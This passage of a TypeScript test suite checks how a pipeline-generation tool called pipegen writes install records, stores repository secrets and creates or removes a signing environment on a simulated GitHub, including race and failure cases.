    const head = w.g.filesAt('o/pipelines', w.g.head('o/pipelines'));
    expect(head.get(reqFile.path)).toBe(reqFile.content);
    expect(head.get('.github/CODEOWNERS')).toBe(coFile.content);
    expect(head.has(recordPath('r'))).toBe(true);
    const r = await record(w);
    expect(r?.planned.orgRequiredWorkflow).toEqual({ path: reqFile.path, rule: l.orgRequiredWorkflow?.rule });
    expect(r?.files.find((f) => f.path === reqFile.path)).toEqual({ repo: 'central', path: reqFile.path, part: 'pipeline', shas: [gitBlobSha(reqFile.content)] });
    expect(r?.edits.find((e) => e.repo === 'central')).toEqual({ repo: 'central', path: '.github/CODEOWNERS', kind: 'codeowners', inserted: coFile.content, originalSha: null, writtenShas: [gitBlobSha(coFile.content)], baseShas: [null] });
    // a lock-plan file missing from the judged batch stops the plan
    expect(() => planDelivery(input(p, c.sha, { locks: l }))).toThrow(/required workflow.*not among the judged files/);
  });

  it('deliver: install record always written to private pipelines (records-only for public apps)', async () => {
    const w = world({ appPrivate: false });
    const p = profile({ private: false });
    const res = await deliver(w.g.octokit(), p, planDelivery(input(p, null)), w.vault, deps(w));
    const r = await record(w);
    expect(r?.centralSha).toBeNull();
    expect(r?.app.private).toBe(false);
    expect(r?.files.every((f) => f.repo === 'app')).toBe(true);
    expect(res.recordHash).toBe(recordHash(r as NonNullable<typeof r>));
    expect([...w.g.filesAt('o/pipelines', w.g.head('o/pipelines')).keys()].sort()).toEqual(['README.md', recordPath('r')]);
    // a public pipelines repo never gets a record, and nothing is written before that is known
    const w2 = world({ appPrivate: false, centralPrivate: false });
    const before = w2.g.calls.length;
    await expect(deliver(w2.g.octokit(), p, planDelivery(input(p, null)), w2.vault, deps(w2))).rejects.toThrow(/public/);
    expect(w2.g.calls.slice(before).filter((c) => !c.route.startsWith('GET '))).toEqual([]);
  });

  it('deliver: record written through a central PR once the central ruleset exists', async () => {
    const w = world();
    const p = profile();
    const c = await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w));
    if (c.kind !== 'pinned') throw new Error('pin');
    w.g.repo('o/pipelines').rules = [{ type: 'pull_request', ruleset_id: 9 }];
    const centralHead = w.g.head('o/pipelines');
    const res = await deliver(w.g.octokit(), p, planDelivery(input(p, c.sha)), w.vault, deps(w));
    expect(w.g.head('o/pipelines')).toBe(centralHead);
    expect(await record(w)).toBeUndefined();
    const onBranch = await record(w, `pipegen/update-${centralProjectName('r')}`);
    expect(onBranch?.app.repo).toBe('r');
    expect(res.centralPrUrl).toMatch(/o\/pipelines\/pull\/1$/);
    expect(w.g.repo('o/pipelines').pulls[0]?.body.split('\n').at(-1)).toBe(recordMarker(res.recordHash));
  });
});

describe('G10 delivery: the record', () => {
  it('deliver: record has pipegenVersion and planned (ruleset, centralRuleset, environments, codeOwners)', async () => {
    const w = world();
    const { plan } = await firstRun(w);
    const r = await record(w);
    expect(r?.pipegenVersion).toBe('0.2.0');
    expect(r?.planned.rulesets?.gate).toEqual(plan.locks.rulesets?.gate);
    expect(r?.planned.rulesets?.reviews).toEqual(plan.locks.rulesets?.reviews);
    expect(r?.planned.centralRuleset).toEqual(plan.locks.centralRuleset);
    expect(r?.planned.environments).toEqual([{ name: 'production', reviewers: true }]);
    expect(r?.planned.codeOwners).toEqual(['@a', '@b']);
    expect(r?.planned.owners).toEqual({ app: ['@a', '@b'], central: ['@a', '@b'] });
    expect(r?.planned.signingMode).toBe('none');
    // G8 (added): no code-owner rule planned (a symlinked app CODEOWNERS) → no owners copied into the record or the preview
    const noRule = locks({ codeowners: undefined, rulesets: { gate: req('/repos/{owner}/{repo}/rulesets', 'pipegen'), reviews: req('/repos/{owner}/{repo}/rulesets', 'pipegen-reviews', { rules: [{ type: 'pull_request', parameters: { require_code_owner_review: false } }] }) }, owners: { app: [], central: ['@a', '@b'] } });
    const w2 = world();
    const p = profile();
    const c = await deliverCentral(w2.g.octokit(), p, centralFiles(), cdeps(w2));
    if (c.kind !== 'pinned') throw new Error('pin');
    const plan2 = planDelivery(input(p, c.sha, { locks: noRule, files: [...centralFiles(), ...appFiles(c.sha).filter((f) => f.path !== 'CODEOWNERS')] }));
    expect(previewText(plan2)).not.toContain('@a');
    await deliver(w2.g.octokit(), p, plan2, w2.vault, deps(w2));
    const r2 = await record(w2);
    expect(r2?.planned.codeOwners).toEqual([]);
    expect(r2?.planned.owners.app).toEqual([]);
  });

  it('deliver: record carries schema 2, app repo id, name, service roots and repo per file', async () => {
    const w = world();
    await firstRun(w);
    const r = await record(w);
    expect(r?.schema).toBe(2);
    expect(r?.app).toEqual({ owner: 'o', repo: 'r', repoId: w.g.repo('o/r').id, defaultBranch: 'main', private: true, ownerType: 'User' });
    expect(r?.name).toBe('r');
    expect(r?.serviceRoots).toEqual(['.']);
    expect(r?.files.filter((f) => f.repo === 'central').map((f) => f.path).sort()).toEqual(['.github/workflows/r--merge.yml', '.github/workflows/r--nightly.yml']);
    const merge = centralFiles()[0] as CreatedFile;
    expect(r?.files.find((f) => f.path === merge.path)?.shas).toEqual([gitBlobSha(merge.content)]);
    expect(r?.files.find((f) => f.path === 'Dockerfile')).toEqual({ repo: 'app', path: 'Dockerfile', part: 'docker', shas: [gitBlobSha('FROM node:24\n')], aiEdited: true });
    // edits in their own forms, never in files[]
    expect(r?.files.some((f) => ['CODEOWNERS', 'package.json', '.github/workflows/deploy.yml', HOOK_FILES['pre-commit']].includes(f.path))).toBe(false);
    const co = r?.edits.find((e) => e.path === 'CODEOWNERS');
    expect(co).toEqual({ repo: 'app', path: 'CODEOWNERS', kind: 'codeowners', inserted: '\n# pipegen:begin\n.github/workflows/** @a @b\n# pipegen:end\n', originalSha: gitBlobSha(CO_ORIG), writtenShas: [gitBlobSha(setupFiles(w).get('CODEOWNERS') as string)], baseShas: [gitBlobSha(CO_ORIG)] });
    expect(r?.edits.find((e) => e.kind === 'hooks')).toMatchObject({ path: HOOK_FILES['pre-commit'], inserted: '  # pipegen:hooks\n  - repo: local\n', originalSha: gitBlobSha(HOOK_ORIG) });
    expect(r?.edits.find((e) => e.kind === 'verify-job')).toEqual({ repo: 'app', path: '.github/workflows/deploy.yml', kind: 'verify-job', jobs: ['pipegen-verify'], needs: [{ job: 'deploy', added: ['pipegen-verify'] }], originalSha: gitBlobSha(DEPLOY_ORIG), writtenShas: [gitBlobSha(DEPLOY_NEW)], baseShas: [gitBlobSha(DEPLOY_ORIG)] });
    expect(r?.central).toEqual({ repoId: 77, createdByPipegen: true });
    expect(r?.scratch).toEqual({ createdByPipegen: true });
    // a second run appends the new blob sha, keeps the first original
    const p = profile();
    const v2 = new SecretVault();
    v2.set(KEY, KEY_VALUE);
    const pin = (await deliverCentral(w.g.octokit(), p, centralFiles(), cdeps(w)) as { sha: string }).sha;
    const plan2 = planDelivery(input(p, pin, { files: [...centralFiles(), ...appFiles(pin).map((f) => (f.path === 'Dockerfile' ? { ...f, content: 'FROM node:26\n' } : f))] }));
    await deliver(w.g.octokit(), p, plan2, v2, deps(w));
    const r2 = await record(w, `pipegen/update-${centralProjectName('r')}`);
    expect(r2?.files.find((f) => f.path === 'Dockerfile')?.shas).toEqual([gitBlobSha('FROM node:24\n'), gitBlobSha('FROM node:26\n')]);
    expect(r2?.createdAt).toBe(r?.createdAt);
  });

  it('deliver: package-lock edit recorded with its original blob sha', async () => {
    const w = world();
    await firstRun(w);
    const r = await record(w);
    expect(r?.edits.find((e) => e.kind === 'package-lock')).toEqual({ repo: 'app', path: 'package-lock.json', kind: 'package-lock', json: 'package.json', originalSha: gitBlobSha(LOCK), writtenShas: [gitBlobSha(LOCK_NEW)], baseShas: [gitBlobSha(LOCK)] });
    expect(r?.edits.find((e) => e.kind === 'package-json')).toEqual({ repo: 'app', path: 'package.json', kind: 'package-json', add: { vitest: '5.0.5' }, setTest: true, previousTest: 'echo "Error: no test specified" && exit 1', lock: 'package-lock.json', originalSha: gitBlobSha(PJ), writtenShas: [gitBlobSha(PJ_NEW)], baseShas: [gitBlobSha(PJ)] });
  });

  it('deliver: record path is installs/<centralProjectName>.json', async () => {
    const name = 'Aux.Service';
    const w = world({ appPrivate: false, repo: name });
    const p = profile({ private: false, repo: name });
    await deliver(w.g.octokit(), p, planDelivery(input(p, null)), w.vault, deps(w));
    const path = `installs/${centralProjectName(name)}.json`;
    expect(path).toMatch(/^installs\/pipegen-[0-9a-f]{20}\.json$/);
    expect(recordPath(name)).toBe(path);
    expect([...w.g.filesAt('o/pipelines', w.g.head('o/pipelines')).keys()]).toContain(path);
    expect((await readRecord(w.g.octokit(), { owner: 'o', repo: 'pipelines' }, name))?.record.name).toBe(centralProjectName(name));
  });

  it('deliver: record hash in the PR body and the local state', async () => {
    const w = world();
    const { res } = await firstRun(w);
    const r = await record(w);
    expect(res.recordHash).toBe(recordHash(r as NonNullable<typeof r>));
    const body = w.g.repo('o/r').pulls[0]?.body as string;
    expect(body.split('\n').at(-1)).toBe(recordMarker(res.recordHash));
    expect(body).toMatch(/pipegen finish/);
    const local = JSON.parse(readFileSync(join(w.home, '.config', 'pipegen', 'records', 'o__r.json'), 'utf8'));
    expect(local).toEqual({ recordHash: res.recordHash, setupPr: res.prNumber, updatedAt: '2026-11-05T12:00:00.000Z' });
  });

  it('deliver: one writeRecord updates the record, the PR-body marker and the local record file', async () => {
    const w = world();
    const { res } = await firstRun(w);
    const r = await record(w) as NonNullable<Awaited<ReturnType<typeof record>>>;
    const next = { ...r, blockFrom: '2026-11-12' };
    const out = await writeRecord(w.g.octokit(), { record: next, setupPr: res.prNumber, via: 'direct', local: { home: w.home, env: {} }, now: () => new Date('2026-11-06T00:00:00Z') });
    expect(out.recordHash).toBe(recordHash(next));
    expect(out.recordHash).not.toBe(res.recordHash);
    expect((await record(w))?.blockFrom).toBe('2026-11-12');
    const body = w.g.repo('o/r').pulls[0]?.body as string;
    expect(body.split('\n').at(-1)).toBe(recordMarker(out.recordHash));
    expect(body).not.toContain(res.recordHash);
    expect(JSON.parse(readFileSync(join(w.home, '.config', 'pipegen', 'records', 'o__r.json'), 'utf8')).recordHash).toBe(out.recordHash);
    // an invalid record is refused before anything is sent
    const before = w.g.calls.length;
    await expect(writeRecord(w.g.octokit(), { record: { ...next, schema: 3 as 2 }, setupPr: 1, via: 'direct', local: { home: w.home, env: {} } })).rejects.toThrow(/version/);
    expect(w.g.calls.length).toBe(before);
  });
});

describe('G10 delivery: secrets and settings before the merge', () => {
  it('deliver: PIPEGEN_FP_KEY stored as a repo secret, kept if it already exists, recorded', async () => {
    const w = world();
    await firstRun(w);
    expect(w.g.repo('o/r').stored.has(FP)).toBe(true);
    // no signing plan: no environment is touched at all before the merge
    expect(w.g.calls.some((c) => c.route.includes('/environments/'))).toBe(false);
    expect((await record(w))?.secrets.find((s) => s.name === FP)).toEqual({ name: FP, scope: 'repo', created: true, githubCreatedAt: w.g.repo('o/r').stored.get(FP) });
    // already there: kept (no PUT, no question), recorded as not created
    const w2 = world();
    w2.g.repo('o/r').stored.set(FP, '2026-01-01T00:00:00Z');
    await firstRun(w2);
    expect(w2.g.calls.some((c) => c.route.startsWith('PUT ') && nameOf(c) === FP)).toBe(false);
    expect(w2.asked.some((q) => q.includes(FP))).toBe(false);
    expect((await record(w2))?.secrets.find((s) => s.name === FP)).toEqual({ name: FP, scope: 'repo', created: false });
  });

  it('deliver: existing secret of the same name is never replaced without its own question; replaced → created false, overwritten', async () => {
    const w = world();
    w.g.repo('o/r').stored.set(KEY, '2026-01-01T00:00:00Z');
    await firstRun(w, {}, {}, { replace: false });
    expect(w.asked.filter((q) => q.includes(KEY) && /already has/.test(q)).length).toBe(1);
    expect(w.g.calls.some((c) => c.route.startsWith('PUT ') && nameOf(c) === KEY)).toBe(false);
    expect((await record(w))?.secrets.find((s) => s.name === KEY)).toEqual({ name: KEY, scope: 'repo', created: false });
    const w2 = world();
    w2.g.repo('o/r').stored.set(KEY, '2026-01-01T00:00:00Z');
    await firstRun(w2, {}, {}, { replace: true });
    expect(w2.g.calls.some((c) => c.route.startsWith('PUT ') && nameOf(c) === KEY)).toBe(true);
    expect((await record(w2))?.secrets.find((s) => s.name === KEY)).toEqual({ name: KEY, scope: 'repo', created: false, overwritten: true, githubCreatedAt: '2026-01-01T00:00:00Z' });
  });

  it('deliver: created secrets and the N4 environment record GitHub\'s created_at', async () => {
    const w = world();
    await firstRun(w, {}, { signingKey: async () => SIGNING }, {}, { signing: { mode: 'key-env', images: [], cosignPubSha256: pubKeySha256(SIGNING.pub) } });
    const r = await record(w);
    const env = w.g.repo('o/r').envs.get('pipegen-signing');
    expect(r?.secrets.find((s) => s.name === KEY)?.githubCreatedAt).toBe(w.g.repo('o/r').stored.get(KEY));
    expect(r?.environments).toEqual([{ name: 'pipegen-signing', created: true, githubCreatedAt: env?.created_at, changed: [], branchPolicyIds: env?.policies.map((x) => x.id) }]);
    for (const n of ['PIPEGEN_COSIGN_KEY', 'PIPEGEN_COSIGN_PASSWORD']) expect(r?.secrets.find((s) => s.name === n)).toEqual({ name: n, scope: 'env:pipegen-signing', created: true, githubCreatedAt: env?.stored.get(n) });
    expect(r?.cosignPubSha256).toBe(pubKeySha256(SIGNING.pub));
    expect(r?.cosignPub).toBe(SIGNING.pub);   // G11: finish sets it as PIPEGEN_COSIGN_PUB after the merge
    // a read-back that fails: recorded without created_at and marked, so uninstall asks instead of deleting
    const w2 = world();
    w2.g.hooks.push((c) => (c.route === 'GET /repos/{owner}/{repo}/actions/secrets/{secret_name}' && nameOf(c) === KEY && w2.g.repo('o/r').stored.has(KEY) ? { status: 500 } : undefined));
    await firstRun(w2);
    expect((await record(w2))?.secrets.find((s) => s.name === KEY)).toEqual({ name: KEY, scope: 'repo', created: true, unconfirmed: true });
  });

  // ---------- ruling G-SIGN1: the run's own N4 environment, made before assembly ----------

  it('makeRunSigningEnvironment: makes pipegen-signing with the default-branch rule, reads it back, and lists it in the leftovers file at once (G-SIGN1)', async () => {
    const w = world();
    const out = await makeRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, 'main', { clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w.home, env: {} }, now: new Date('2026-11-05T12:00:00Z') });
    const env = w.g.repo('o/r').envs.get('pipegen-signing');
    expect(env?.deployment_branch_policy).toEqual({ protected_branches: false, custom_branch_policies: true });
    expect(env?.policies.map((x) => ({ name: x.name, type: x.type }))).toEqual([{ name: 'main', type: 'branch' }]);
    expect(out).toEqual({ env: { name: 'pipegen-signing', created: true, githubCreatedAt: env?.created_at, changed: [], branchPolicyIds: env?.policies.map((x) => x.id) } });
    // read back after the writes: the last environment call is a read of its branch rules
    const envCalls = w.g.calls.filter((c) => c.route.includes('/environments/'));
    expect(envCalls.at(-1)?.route).toBe('GET /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies');
    // nothing but the environment and its one rule was written
    expect(w.g.calls.filter((c) => !c.route.startsWith('GET ')).map((c) => c.route)).toEqual(['PUT /repos/{owner}/{repo}/environments/{environment_name}', 'POST /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies']);
    const left = JSON.parse(readFileSync(join(w.home, '.config', 'pipegen', 'records', 'o__r.leftovers.json'), 'utf8')) as { items: unknown[] };
    expect(left.items).toEqual([{ kind: 'environment', name: 'pipegen-signing', repo: 'o/r', githubCreatedAt: env?.created_at }]);
  });

  it('makeRunSigningEnvironment: an environment already there is never touched: off, no write, no leftover (G-SIGN1)', async () => {
    for (const there of [
      { deployment_branch_policy: null, policies: [] },
      { deployment_branch_policy: { protected_branches: true, custom_branch_policies: false }, policies: [] },
      { deployment_branch_policy: { protected_branches: false, custom_branch_policies: true }, policies: [{ id: 1, name: 'main', type: 'branch' as const }, { id: 2, name: 'dev', type: 'branch' as const }] },
    ]) {
      const w = world();
      w.g.repo('o/r').envs.set('pipegen-signing', { id: 5, created_at: '2026-01-01T00:00:00Z', wait_timer: 0, prevent_self_review: false, reviewers: [], can_admins_bypass: true, stored: new Map(), ...there });
      const out = await makeRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, 'main', { clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w.home, env: {} }, now: new Date('2026-11-05T12:00:00Z') });
      expect(out).toEqual({ off: expect.stringMatching(/already there.*leaves it as it is/) });
      expect(w.g.calls.filter((c) => !c.route.startsWith('GET '))).toEqual([]);
      expect(existsSync(join(w.home, '.config', 'pipegen', 'records', 'o__r.leftovers.json'))).toBe(false);
    }
  });

  it('makeRunSigningEnvironment: a rule that does not read back default-branch only, or a refused rule, is off, and the half-made environment is deleted (G-SIGN1, G-SIGN1-R2 spec L3)', async () => {
    const left = (w: World): unknown[] => { const f = join(w.home, '.config', 'pipegen', 'records', 'o__r.leftovers.json'); return existsSync(f) ? (JSON.parse(readFileSync(f, 'utf8')) as { items: unknown[] }).items : []; };
    const make = (w: World) => makeRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, 'main', { clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w.home, env: {} }, now: new Date('2026-11-05T12:00:00Z') });
    const deletes = (w: World) => w.g.calls.filter((c) => c.route === 'DELETE /repos/{owner}/{repo}/environments/{environment_name}').map((c) => c.params.environment_name);
    // GitHub answers the read-back with another rule as well
    const w = world();
    w.g.hooks.push((c) => (c.route === 'GET /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies' ? { status: 200, data: { total_count: 2, branch_policies: [{ id: 1, name: 'main', type: 'branch' }, { id: 2, name: '*', type: 'branch' }] } } : undefined));
    expect(await make(w)).toEqual({ off: expect.stringMatching(/default branch only.*deleted it again/s) });
    expect(deletes(w)).toEqual(['pipegen-signing']);
    expect(w.g.repo('o/r').envs.has('pipegen-signing')).toBe(false);
    expect(left(w)).toEqual([]);
    // the rule's POST is refused: the environment was made, so it is deleted again
    const w2 = world();
    w2.g.hooks.push((c) => (c.route === 'POST /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies' ? { status: 403, data: { message: 'nope' } } : undefined));
    expect(await make(w2)).toEqual({ off: expect.stringMatching(/deleted it again/) });
    expect(deletes(w2)).toEqual(['pipegen-signing']);
    expect(w2.g.repo('o/r').envs.has('pipegen-signing')).toBe(false);
    expect(left(w2)).toEqual([]);
    // the delete of the half-made one is refused too: listed with its created_at, and said
    const w2b = world();
    w2b.g.hooks.push((c) => (c.route === 'POST /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies' || c.route === 'DELETE /repos/{owner}/{repo}/environments/{environment_name}' ? { status: 403, data: { message: 'nope' } } : undefined));
    expect(await make(w2b)).toEqual({ off: expect.stringMatching(/couldn't delete it.*o__r\.leftovers\.json/s) });
    expect(left(w2b)).toEqual([{ kind: 'environment', name: 'pipegen-signing', repo: 'o/r', githubCreatedAt: w2b.g.repo('o/r').envs.get('pipegen-signing')?.created_at }]);
    // the PUT itself is refused: nothing was made, nothing is listed
    const w3 = world();
    w3.g.hooks.push((c) => (c.route === 'PUT /repos/{owner}/{repo}/environments/{environment_name}' ? { status: 403, data: { message: 'nope' } } : undefined));
    expect(await make(w3)).toEqual({ off: expect.any(String) });
    expect(w3.g.repo('o/r').envs.has('pipegen-signing')).toBe(false);
    expect(left(w3)).toEqual([]);
    // spec L2 (N3): a PUT that fails and a follow-up read that can't be read: listed by name (pipegen can't tell)
    const w4 = world();
    let gets = 0;
    w4.g.hooks.push((c) => {
      if (c.route === 'PUT /repos/{owner}/{repo}/environments/{environment_name}') return { status: 500, data: { message: 'x' } };
      if (c.route === 'GET /repos/{owner}/{repo}/environments/{environment_name}' && ++gets > 2) return { status: 500, data: { message: 'x' } };
      return undefined;
    });
    expect(await make(w4)).toEqual({ off: expect.any(String) });
    expect(left(w4)).toEqual([{ kind: 'environment', name: 'pipegen-signing', repo: 'o/r' }]);
    expect(deletes(w4)).toEqual([]);
  });

  it('makeRunSigningEnvironment: G-SIGN1-R2 spec L2 an environment that appears between the two reads, or a first read that fails, is off with nothing written', async () => {
    const make = (w: World) => makeRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, 'main', { clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w.home, env: {} }, now: new Date('2026-11-05T12:00:00Z') });
    // N1: someone makes it right after pipegen's first read (ensureSigningEnvironment's onlyNew read finds it)
    const w = world();
    let gets = 0;
    w.g.hooks.push((c) => {
      if (c.route === 'GET /repos/{owner}/{repo}/environments/{environment_name}' && ++gets === 2) {
        w.g.repo('o/r').envs.set('pipegen-signing', { id: 5, created_at: '2026-01-01T00:00:00Z', wait_timer: 30, prevent_self_review: false, reviewers: [{ type: 'User', id: 42 }], can_admins_bypass: false, deployment_branch_policy: null, policies: [], stored: new Map() });
      }
      return undefined;
    });
    expect(await make(w)).toEqual({ off: expect.stringMatching(/already there/) });
    expect(w.g.calls.filter((c) => !c.route.startsWith('GET '))).toEqual([]);
    expect(w.g.repo('o/r').envs.get('pipegen-signing')?.wait_timer).toBe(30);
    // N2: the first read fails: nothing is written, nothing listed
    const w2 = world();
    w2.g.hooks.push((c) => (c.route === 'GET /repos/{owner}/{repo}/environments/{environment_name}' ? { status: 500, data: { message: 'x' } } : undefined));
    expect(await make(w2)).toEqual({ off: expect.any(String) });
    expect(w2.g.calls.filter((c) => !c.route.startsWith('GET '))).toEqual([]);
    expect(existsSync(join(w2.home, '.config', 'pipegen', 'records', 'o__r.leftovers.json'))).toBe(false);
  });

  it('makeRunSigningEnvironment: G-SIGN1-R2 sec L1 a PUT that answers with an older environment (created_at != updated_at) claims nothing', async () => {
    const w = world();
    // a racer's environment lands between pipegen's reads and its PUT
    w.g.hooks.push((c) => {
      if (c.route === 'PUT /repos/{owner}/{repo}/environments/{environment_name}' && !w.g.repo('o/r').envs.has('pipegen-signing')) {
        w.g.repo('o/r').envs.set('pipegen-signing', { id: 5, created_at: '2026-11-05T11:59:59Z', wait_timer: 30, prevent_self_review: false, reviewers: [{ type: 'User', id: 42 }], can_admins_bypass: false, deployment_branch_policy: null, policies: [], stored: new Map([['TEAM_NOTE', '2026-11-05T11:59:59Z']]) });
      }
      return undefined;
    });
    const out = await makeRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, 'main', { clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w.home, env: {} }, now: new Date('2026-11-05T12:00:00Z') });
    expect(out).toEqual({ off: expect.stringMatching(/not one pipegen just made/) });
    // no rule added to it, nothing deleted; G-SIGN1-R3 sec r2-L2: listed by name only (no created_at: never taken for pipegen's own)
    expect(w.g.calls.some((c) => c.route.startsWith('POST ') || c.route.startsWith('DELETE '))).toBe(false);
    expect(w.g.repo('o/r').envs.get('pipegen-signing')?.stored.has('TEAM_NOTE')).toBe(true);
    expect((JSON.parse(readFileSync(join(w.home, '.config', 'pipegen', 'records', 'o__r.leftovers.json'), 'utf8')) as { items: unknown[] }).items).toEqual([{ kind: 'environment', name: 'pipegen-signing', repo: 'o/r' }]);
  });

  it('makeRunSigningEnvironment: G-SIGN1-R2 sec M2 a leftovers file it can not read or write is found before the PUT (off, nothing written); one that fails after the make deletes the environment', async () => {
    const make = (w: World, local: Record<string, unknown> = {}) => makeRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, 'main', { clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w.home, env: {}, ...local }, now: new Date('2026-11-05T12:00:00Z') });
    const file = (w: World) => join(w.home, '.config', 'pipegen', 'records', 'o__r.leftovers.json');
    // a leftovers file this version can't read (a newer pipegen's field)
    const w = world();
    await recordMod.addLocalLeftovers({ owner: 'o', repo: 'r' }, [{ kind: 'branch', name: SETUP_BRANCH, repo: 'o/r' }], new Date(), { home: w.home, env: {} });
    const text = JSON.parse(readFileSync(file(w), 'utf8')) as Record<string, unknown>;
    writeFileSync(file(w), JSON.stringify({ ...text, newField: 1 }));
    expect(await make(w)).toEqual({ off: expect.stringMatching(/leftovers/) });
    expect(w.g.calls.filter((c) => !c.route.startsWith('GET '))).toEqual([]);
    // a records folder pipegen won't use (another owner)
    const w2 = world();
    expect(await make(w2, { uid: 4242424 })).toEqual({ off: expect.any(String) });
    expect(w2.g.calls.filter((c) => !c.route.startsWith('GET '))).toEqual([]);
    // the file breaks after the make: the environment is deleted again, and the run goes on unsigned
    const w3 = world();
    w3.g.hooks.push((c) => { if (c.route === 'POST /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies') { mkdirSync(join(w3.home, '.config', 'pipegen', 'records'), { recursive: true }); writeFileSync(file(w3), 'not json'); } return undefined; });
    expect(await make(w3)).toEqual({ off: expect.stringMatching(/couldn't list it.*deleted it again/s) });
    expect(w3.g.repo('o/r').envs.has('pipegen-signing')).toBe(false);
    // ... and if that delete is refused too, the run stops, naming it
    const w4 = world();
    w4.g.hooks.push((c) => {
      if (c.route === 'POST /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies') { mkdirSync(join(w4.home, '.config', 'pipegen', 'records'), { recursive: true }); writeFileSync(file(w4), 'not json'); }
      return c.route === 'DELETE /repos/{owner}/{repo}/environments/{environment_name}' ? { status: 403, data: { message: 'nope' } } : undefined;
    });
    const e = await make(w4).then(() => null, (x: unknown) => x);
    expect(e).toBeInstanceOf(DeliverError);
    expect((e as DeliverError).message).toMatch(/pipegen-signing/);
    expect((e as DeliverError).leftovers).toEqual(['environment pipegen-signing']);
    // G-SIGN1-R3 wording: the leftovers write itself failed, so the message never says it stays listed
    expect((e as DeliverError).message).not.toMatch(/stays listed/);
    // spec L3's path with a leftovers write that fails (the rule POST refused, the file broken, the delete refused): not "stays listed"
    const w5 = world();
    w5.g.hooks.push((c) => {
      if (c.route === 'POST /repos/{owner}/{repo}/environments/{environment_name}/deployment-branch-policies') { mkdirSync(join(w5.home, '.config', 'pipegen', 'records'), { recursive: true }); writeFileSync(file(w5), 'not json'); return { status: 403, data: { message: 'nope' } }; }
      return c.route === 'DELETE /repos/{owner}/{repo}/environments/{environment_name}' ? { status: 403, data: { message: 'nope' } } : undefined;
    });
    const o5 = await make(w5);
    expect(o5).toEqual({ off: expect.stringMatching(/couldn't delete it/) });
    expect((o5 as { off: string }).off).not.toMatch(/stays listed/);
    expect((o5 as { off: string }).off).toMatch(/couldn't list it/);
  });

  it('dropRunSigningEnvironment: deletes the environment this run made and takes it off the leftovers file (G-SIGN1-R1)', async () => {
    const x = (w: World) => ({ clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w.home, env: {} }, now: new Date('2026-11-05T12:00:00Z') });
    const file = (w: World) => join(w.home, '.config', 'pipegen', 'records', 'o__r.leftovers.json');
    const w = world();
    // another leftover of the same app stays in the file
    await recordMod.addLocalLeftovers({ owner: 'o', repo: 'r' }, [{ kind: 'branch', name: SETUP_BRANCH, repo: 'o/r' }], new Date('2026-11-05T11:00:00Z'), { home: w.home, env: {} });
    const made = await makeRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, 'main', x(w));
    if (!('env' in made)) throw new Error('expected the environment');
    expect(await dropRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, made.env, x(w))).toEqual({ dropped: true });
    expect(w.g.repo('o/r').envs.has('pipegen-signing')).toBe(false);
    expect(w.g.calls.filter((c) => c.route === 'DELETE /repos/{owner}/{repo}/environments/{environment_name}').map((c) => c.params.environment_name)).toEqual(['pipegen-signing']);
    expect((JSON.parse(readFileSync(file(w), 'utf8')) as { items: { kind: string }[] }).items).toEqual([{ kind: 'branch', name: SETUP_BRANCH, repo: 'o/r' }]);
    // already gone: nothing to delete, the entry goes
    const w2 = world();
    const m2 = await makeRunSigningEnvironment(w2.g.octokit(), { owner: 'o', repo: 'r' }, 'main', x(w2));
    if (!('env' in m2)) throw new Error('expected the environment');
    w2.g.repo('o/r').envs.delete('pipegen-signing');
    expect(await dropRunSigningEnvironment(w2.g.octokit(), { owner: 'o', repo: 'r' }, m2.env, x(w2))).toEqual({ dropped: true });
    expect(w2.g.calls.some((c) => c.route.startsWith('DELETE '))).toBe(false);
    expect((JSON.parse(readFileSync(file(w2), 'utf8')) as { items: unknown[] }).items).toEqual([]);
  });

  it('dropRunSigningEnvironment: a refused delete, or an environment that is not the one this run made, keeps it and its leftovers entry, and says where (G-SIGN1-R1)', async () => {
    const x = (w: World) => ({ clock: { budget: newRateBudget(), sleep: async () => {} }, local: { home: w.home, env: {} }, now: new Date('2026-11-05T12:00:00Z') });
    const file = (w: World) => join(w.home, '.config', 'pipegen', 'records', 'o__r.leftovers.json');
    const w = world();
    const made = await makeRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, 'main', x(w));
    if (!('env' in made)) throw new Error('expected the environment');
    w.g.hooks.push((c) => (c.route === 'DELETE /repos/{owner}/{repo}/environments/{environment_name}' ? { status: 403, data: { message: 'nope' } } : undefined));
    const out = await dropRunSigningEnvironment(w.g.octokit(), { owner: 'o', repo: 'r' }, made.env, x(w));
    expect(out).toEqual({ left: expect.stringMatching(/HTTP 403.*o__r\.leftovers\.json/) });
    expect(w.g.repo('o/r').envs.has('pipegen-signing')).toBe(true);
    expect((JSON.parse(readFileSync(file(w), 'utf8')) as { items: { name: string }[] }).items.map((i) => i.name)).toEqual(['pipegen-signing']);
    // someone replaced it (another created_at): never deleted
    const w2 = world();
    const m2 = await makeRunSigningEnvironment(w2.g.octokit(), { owner: 'o', repo: 'r' }, 'main', x(w2));
    if (!('env' in m2)) throw new Error('expected the environment');
    (w2.g.repo('o/r').envs.get('pipegen-signing') as { created_at: string }).created_at = '2026-11-05T13:00:00Z';
    const o2 = await dropRunSigningEnvironment(w2.g.octokit(), { owner: 'o', repo: 'r' }, m2.env, x(w2));
    expect(o2).toEqual({ left: expect.stringMatching(/not the one this run made.*o__r\.leftovers\.json/) });
